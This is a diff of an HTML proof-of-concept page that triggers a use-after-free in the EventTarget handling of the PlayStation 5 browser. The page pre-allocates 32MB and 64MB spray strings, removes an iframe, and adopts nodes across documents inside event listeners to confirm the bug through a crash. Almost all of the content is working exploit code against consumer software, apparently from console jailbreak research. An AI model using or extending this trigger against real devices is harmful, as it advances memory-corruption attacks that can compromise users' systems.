@@ -2,68 +2,103 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v53 - EventTarget UAF</title>
+<title>PS5 v54 - EventTarget UAF Pre-alloc</title>
 <style>
 body { background: #0a0a0a; color: #00ff41; font-family: 'MS Gothic', monospace; padding: 20px; }
 button { display: block; width: 100%; padding: 15px; margin: 5px 0; font-size: 18px; background: #111; color: #00ff41; border: 1px solid #00ff41; cursor: pointer; }
 button:hover { background: #00ff41; color: #000; }
+button:disabled { opacity: 0.3; cursor: not-allowed; }
 pre { white-space: pre-wrap; word-wrap: break-word; margin-top: 20px; }
 </style>
 </head>
 <body>
 
-<h3>EventTarget UAF Trigger</h3>
-<p>Click ONE button below. Wait 5 seconds. If browser crashes, UAF is confirmed at that size.</p>
+<h3>EventTarget UAF — Pre-allocated String</h3>
+<p id="status">Building spray strings... please wait.</p>
 
-<button onclick="triggerUAF(1)">Trigger 1MB Spray</button>
-<button onclick="triggerUAF(4)">Trigger 4MB Spray</button>
-<button onclick="triggerUAF(8)">Trigger 8MB Spray</button>
-<button onclick="triggerUAF(16)">Trigger 16MB Spray</button>
-<button onclick="triggerUAF(32)">Trigger 32MB Spray (Original size was 64MB)</button>
+<div id="buttons" style="display:none">
+<button onclick="triggerUAF('spray32')">Trigger 32MB (Original half)</button>
+<button onclick="triggerUAF('spray64')">Trigger 64MB (Original full size)</button>
+</div>
 
 <pre id="out"></pre>
 
 <script>
 var out = document.getElementById("out");
+var status = document.getElementById("status");
+var buttons = document.getElementById("buttons");
 function log(m) { out.textContent += m + "\n"; }
 
-function triggerUAF(mbSize) {
-    log("\n[*] Triggering UAF with " + mbSize + "MB spray...");
-    log("[*] If browser crashes now, UAF is confirmed at " + mbSize + "MB.");
+// Pre-allocate strings
+var spray32 = null;
+var spray64 = null;
+
+log("=== Pre-allocating spray strings ===");
+
+try {
+  log("[*] Building 32MB string...");
+  spray32 = 'A'.repeat(1024 * 1024 * 32);
+  log("[+] 32MB string ready (" + spray32.length + " bytes)");
+} catch(e) {
+  log("[-] 32MB failed: " + e.message);
+}
+
+try {
+  log("[*] Building 64MB string...");
+  spray64 = 'A'.repeat(1024 * 1024 * 32) + 'A'.repeat(1024 * 1024 * 32);
+  log("[+] 64MB string ready (" + spray64.length + " bytes)");
+} catch(e) {
+  log("[-] 64MB failed: " + e.message);
+}
+
+log("");
+log("=== Ready ===");
+status.textContent = "Ready. Click a button below to trigger UAF.";
+buttons.style.display = "block";
+
+function triggerUAF(sprayVar) {
+  var spray = window[sprayVar];
+  if (!spray) {
+    log("[-] Spray string not available");
+    return;
+  }
+  
+  var sizeMB = spray.length / (1024 * 1024);
+  
+  log("\n[*] Triggering UAF with " + sizeMB.toFixed(0) + "MB spray...");
+  log("[*] If browser crashes now, UAF is confirmed!");
+  
+  try {
+    var f = document.body.appendChild(document.createElement('iframe'));
+    var a = document.createElement('div');
+    var b = a.appendChild(document.createElement('div'));
     
-    try {
-        const f = document.body.appendChild(document.createElement('iframe'));
-        const a = document.createElement('div');
-        const b = a.appendChild(document.createElement('div'));
-        
-        // This must be evaluated inside the event listener to maintain context
-        a.addEventListener('a', eval(`(function () {
-            document.adoptNode(a);
-            f.remove();
-            throw {
-                line: 1,
-                column: 1,
-                sourceURL: 'A'.repeat(1024 * 1024 * ${mbSize})
-            };
-        })`));
-        
-        a.addEventListener('a', () => {});
-        
-        b.addEventListener('a', () => {
-            f.contentDocument.adoptNode(a);
-        });
-        
-        b.dispatchEvent(new Event('a', { bubbles: true }));
-        
-        log("[+] Did not crash at " + mbSize + "MB.");
-        log("[*] Try the next size up.");
-        
-    } catch(e) {
-        log("[!] Exception caught: " + e.message);
-        if (e.message.indexOf("memory") !== -1) {
-            log("[!] OOM! Try smaller size.");
-        }
-    }
+    // Use pre-allocated string
+    a.addEventListener('a', function() {
+      document.adoptNode(a);
+      f.remove();
+      throw {
+        line: 1,
+        column: 1,
+        sourceURL: spray
+      };
+    });
+    
+    a.addEventListener('a', function() {});
+    
+    b.addEventListener('a', function() {
+      try {
+        f.contentDocument.adoptNode(a);
+      } catch(e) {}
+    });
+    
+    b.dispatchEvent(new Event('a', { bubbles: true }));
+    
+    log("[+] Did not crash at " + sizeMB.toFixed(0) + "MB.");
+    
+  } catch(e) {
+    log("[!] Exception: " + e.message);
+  }
 }
 </script>
 </body>
